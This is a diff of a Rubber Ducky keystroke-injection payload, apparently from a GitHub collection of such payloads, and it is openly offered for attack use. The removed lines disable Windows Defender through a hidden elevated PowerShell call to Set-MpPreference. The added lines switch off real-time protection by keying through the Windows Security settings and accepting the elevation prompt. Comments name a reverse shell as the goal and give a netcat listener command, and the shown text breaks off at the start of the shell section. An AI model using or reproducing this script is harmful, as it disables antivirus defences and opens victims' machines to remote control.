@@ -1,17 +1,33 @@
-REM Turn off Windows Defender and start reverse shell
-REM
+REM --------
+REM https://github.com/TylerPaplham/Rubber-Ducky-Payloads/edit/main/Reverse_Shell
+REM Ducky Script to disable AV and set up a reverse shell
+REM on attacker machine make sure to set up netcat using the following command "nc -lnvp <your_port>"
+REM --------
 DELAY 1000
-GUI r
-DELAY 200
-REM Start an elevated powershell instance which will disable Windows Defender.
-STRING powershell -w hidden start powershell -A 'Set-MpPreference -DisableRea $true' -V runAs
+CONTROL ESCAPE
+DELAY 500
+STRING Virus & threat protection
+DELAY 500
 ENTER
-DELAY 1000
-REM if you need administrator [left, enter and delay 1000]
-LEFT
+DELAY 2500
+TAB
+DELAY 500
+TAB 
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
 ENTER
-DELAY 1000
+DELAY 500
+SPACE
+DELAY 800
 ALT y
+DELAY 1500
+ALT SPACE
+DELAY 500
+STRING c
+REM Start of reverse shell
 DELAY 1000
 GUI r
 DELAY 100
